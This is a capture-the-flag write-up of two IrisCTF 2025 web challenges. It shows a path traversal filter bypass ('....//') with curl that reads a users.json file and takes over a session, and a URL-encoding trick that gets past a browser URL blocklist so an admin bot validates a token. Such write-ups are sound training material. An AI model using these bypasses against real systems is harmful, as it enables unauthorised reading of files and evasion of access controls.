----------------

### CTF: IRISCTF 2025

----------------

![image](https://github.com/user-attachments/assets/346755b1-758e-4e39-9594-852a137ceae5)

----------------

### CHALLENGES-:

- WEB
  - Password Manager
  - Political

----------------

### WEB

----------------

### PASSWORD MANAGER

-----------------

![image](https://github.com/user-attachments/assets/46f3199e-06e7-404b-9acd-5f883da93c10)

-----------------

### Important Code Snippets

- Json struct is `{"usr":"<username>","pwd":"<password>"}`

```golang
type Auth struct {
	User     string `json:"usr"`
	Password string `json:"pwd"`
}
```

- Login funtion for route `/login` is seen below.The function validates the login with the `validateLogin` function and creates a cookie if the credentials are correct.

```golang
func login(w http.ResponseWriter, r *http.Request) {
	var auth Auth

	if err := json.NewDecoder(r.Body).Decode(&auth); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("Invalid request!"))
		return
	}

	if !validateLogin(auth.User, auth.Password) {
		w.WriteHeader(http.StatusUnauthorized)
		w.Write([]byte("Invalid password!"))
		return
	}

	authJson, err := json.Marshal(auth)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("Error occurred! (this should not happen, please open a ticket!)"))
		return
	}

	http.SetCookie(w, &http.Cookie{
		Name:  "auth",
		Value: base64.RawStdEncoding.EncodeToString(authJson),
	})
	w.Write([]byte("{}"))
}
```
- Another important part of the code to note is that all users are stacked in the `users.json` file as seen below.

```golang
// Initialize users var
	file, err := os.Open("./users.json")
	if err != nil {
		fmt.Printf("Error reading users.json: %v\n", err)
		return
	}

	if err := json.NewDecoder(file).Decode(&users); err != nil {
		fmt.Printf("Error reading users.json: %v\n", err)
		return
	}
```

- Lastly, the main sink is seen in this code.The pages are controlled with the `fullpath` variable in the manner `"./pages" + path` which is passed to the `os.stat()` function to read the files.`Path` can be controlled by an attacker to gain path traversal but there is a slight twist.`../` is replaced with and empty string,we can easily bypass this with the string `..././`,`../` gets filtered out and a new `../` is created.We will abuse this to read the `users.json` file.

```golang
func pages(w http.ResponseWriter, r *http.Request) {
	// You. Shall. Not. Path traverse!
	path := PathReplacer.Replace(r.URL.Path)

	if path == "/" {
		homepage(w, r)
		return
	}

	if path == "/login" {
		login(w, r)
		return
	}

	if path == "/getpasswords" {
		getpasswords(w, r)
		return
	}

	fullPath := "./pages" + path

	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		notfound(w, r)
		return
	}

	http.ServeFile(w, r, fullPath)
}
```

Path Replacer func-:

```golang
var PathReplacer = strings.NewReplacer(
	"../", "",
)
```

### Exploitation-:

- Users.json with path traversal

```bash
❯ curl --path-as-is https://password-manager-web.chal.irisc.tf/....//users.json
{
    "skat": "rf=easy-its+just&spicysines123!@"
}
```

- Login with user `skat` and grab his cookie

```bash
❯ curl https://password-manager-web.chal.irisc.tf/login -H "Content-Type: application/json" -d '{"usr":"skat","pwd":"rf=easy-its+just&spicysines123!@"}' -v
* Host password-manager-web.chal.irisc.tf:443 was resolved.
* IPv6: (none)
* IPv4: 34.32.139.120
*   Trying 34.32.139.120:443...
* GnuTLS ciphers: NORMAL:-ARCFOUR-128:-CTYPE-ALL:+CTYPE-X509:-VERS-SSL3.0
* ALPN: curl offers h2,http/1.1
* found 146 certificates in /etc/ssl/certs/ca-certificates.crt
* found 440 certificates in /etc/ssl/certs
* SSL connection using TLS1.3 / ECDHE_RSA_AES_256_GCM_SHA384
*   server certificate verification OK
*   server certificate status verification SKIPPED
*   common name: *.chal.irisc.tf (matched)
*   server certificate expiration date OK
*   server certificate activation date OK
*   certificate public key: RSA
*   certificate version: #3
*   subject: CN=*.chal.irisc.tf
*   start date: Fri, 27 Dec 2024 22:43:12 GMT
*   expire date: Thu, 27 Mar 2025 22:43:11 GMT
*   issuer: C=US,O=Let's Encrypt,CN=R10
* ALPN: server accepted h2
* Connected to password-manager-web.chal.irisc.tf (34.32.139.120) port 443
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://password-manager-web.chal.irisc.tf/login
* [HTTP/2] [1] [:method: POST]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: password-manager-web.chal.irisc.tf]
* [HTTP/2] [1] [:path: /login]
* [HTTP/2] [1] [user-agent: curl/8.11.0]
* [HTTP/2] [1] [accept: */*]
* [HTTP/2] [1] [content-type: application/json]
* [HTTP/2] [1] [content-length: 55]
> POST /login HTTP/2
> Host: password-manager-web.chal.irisc.tf
> User-Agent: curl/8.11.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 55
> 
* upload completely sent off: 55 bytes
< HTTP/2 200 
< date: Sat, 04 Jan 2025 07:17:12 GMT
< content-type: text/plain; charset=utf-8
< content-length: 2
< set-cookie: auth=eyJ1c3IiOiJza2F0IiwicHdkIjoicmY9ZWFzeS1pdHMranVzdFx1MDAyNnNwaWN5c2luZXMxMjMhQCJ9
< strict-transport-security: max-age=31536000; includeSubDomains
< 
* Connection #0 to host password-manager-web.chal.irisc.tf left intact
```

- Make a request to route `getpasswords` to find the flag

```bash
❯ curl https://password-manager-web.chal.irisc.tf/getpasswords -H "Cookie: auth=eyJ1c3IiOiJza2F0IiwicHdkIjoicmY9ZWFzeS1pdHMranVzdFx1MDAyNnNwaWN5c2luZXMxMjMhQCJ9"
[{"Password":"mypasswordisskat","Title":"Discord","URL":"https://example.com","Username":"skat@skat.skat"},{"Password":"irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}","Title":"RF-Quabber Forum","URL":"https://example.com","Username":"skat"},{"Password":"this-isnt-a-real-password","Title":"Iris CTF","URL":"https://2025.irisc.tf","Username":"skat"}]
```

- Flag-:`irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}`

----------------

### POLITICAL

----------------

![image](https://github.com/user-attachments/assets/58243d3f-9037-4aae-8c0c-08be194d577b)

----------------

- There are three main files to check `policy.json`,`chal.py` and `bot.js`.

![image](https://github.com/user-attachments/assets/9b605288-be54-4a39-a5f3-3f56133beaf5)

---------------

### Explaining the routes in `chal.py`

---------------

- Code-:

```python3
from flask import Flask, request, send_file
import secrets

app = Flask(__name__)
FLAG = "irisctf{testflag}"
ADMIN = "redacted"

valid_tokens = {}

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/giveflag")
def hello_world():
    if "token" not in request.args or "admin" not in request.cookies:
        return "Who are you?"

    token = request.args["token"]
    admin = request.cookies["admin"]
    if token not in valid_tokens or admin != ADMIN:
        return "Why are you?"

    valid_tokens[token] = True
    return "GG"

@app.route("/token")
def tok():
    token = secrets.token_hex(16)
    valid_tokens[token] = False
    return token

@app.route("/redeem", methods=["POST"])
def redeem():
    if "token" not in request.form:
        return "Give me token"

    token = request.form["token"]
    if token not in valid_tokens or valid_tokens[token] != True:
        return "Nice try."

    return FLAG
```

- Route `giveflag` checks if the request contains a token and a cookie with user `admin` and sends text `GG` if it contains those conditions.Lastly,it also appends the token to the `valid_token` dict.

```python3
@app.route("/giveflag")
def hello_world():
    if "token" not in request.args or "admin" not in request.cookies:
        return "Who are you?"

    token = request.args["token"]
    admin = request.cookies["admin"]
    if token not in valid_tokens or admin != ADMIN:
        return "Why are you?"

    valid_tokens[token] = True
    return "GG"
```

- Route `/token` generates a token

```python3
@app.route("/token")
def tok():
    token = secrets.token_hex(16)
    valid_tokens[token] = False
    return token
```

- Route `redeem` checks if the token in a post data is the `valid_tokens` and is set to `True`, it rturns the flag.

```python3
@app.route("/redeem", methods=["POST"])
def redeem():
    if "token" not in request.form:
        return "Give me token"

    token = request.form["token"]
    if token not in valid_tokens or valid_tokens[token] != True:
        return "Nice try."

    return FLAG
```

--------------

### Explaining the bot code

-------------

- The bot was written in `javascript`.The Chrome's `policy.json` blocks any url that contains path `/giveflag` and contains the query `?token=`.

```json
{
	"URLBlocklist": ["*/giveflag", "*?token=*"]
}
```
- The bot only makes a request to url that starts with `http` and `https`.Although, it only allow url `https://political-web.chal.irisc.tf/` and must end with `/`.

```javascript
 if (!url.startsWith('http://localhost:1337/') && !url.startsWith('https://localhost:1337/')) {
      socket.state = 'ERROR';
      socket.write('Invalid URL (must start with http:// or https://).\n');
      socket.destroy();
      return;
    }
    socket.state = 'LOADED';
    let cookie = JSON.parse(fs.readFileSync('/home/user/cookie'));
```

- Although, the bot also sets its cookie to site `https://political-web.chal.irisc.tf` as explained in the `README.md`.

```md
# Note about cookie

The challenge bot has its cookie set on `https://political-web.chal.irisc.tf`.
```

- Lastly,we can't steal with `document.cookie` because the cookie `httponly` header is set to true.

```json
{
  "name": "admin",
  "value": "redacted",
  "domain": "localhost:1337",
  "url": "http://localhost:1337/",
  "path": "/",
  "httpOnly": true,
  "secure": true
}
```

---------------

### EXPLOITATION

---------------

- I urlencoded some of the url's characters to prevent the policy from matching the regex as seen below.I urlencoded char `f` in `giveflag` and `t` in `token`.The bot will make a request to `giveflag` to validate our token since it has the admin cookie and set it to `true` in the server.Later,we can redeem our flag.

```
https://political-web.chal.irisc.tf/give%66lag?%74oken=<token>
```

- Grabbed my token

![image](https://github.com/user-attachments/assets/cc43f9ca-b64f-4865-a765-da6742cdec0d)

- Make an admin request with the bot

![image](https://github.com/user-attachments/assets/94238dbe-93a8-480a-80b0-3040fe6a1901)

- Redeem the flag

```bash
❯ curl https://political-web.chal.irisc.tf/redeem -d "token=501ad20a1ebe705cad85011197db3920"
irisctf{flag_blocked_by_admin}
```

- Flag-:`irisctf{flag_blocked_by_admin}`

----------------

### THANKS FOR READING 

---------------

